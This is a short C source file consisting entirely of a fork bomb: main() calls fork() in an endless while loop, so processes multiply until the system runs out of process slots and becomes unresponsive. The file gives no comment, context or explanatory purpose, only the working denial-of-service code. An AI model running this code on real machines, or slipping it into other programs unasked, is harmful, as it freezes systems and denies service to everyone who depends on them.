# include <unistd.h>
# include <stdlib.h>

int main() {
  
  while(1) fork();

  exit(0);
}
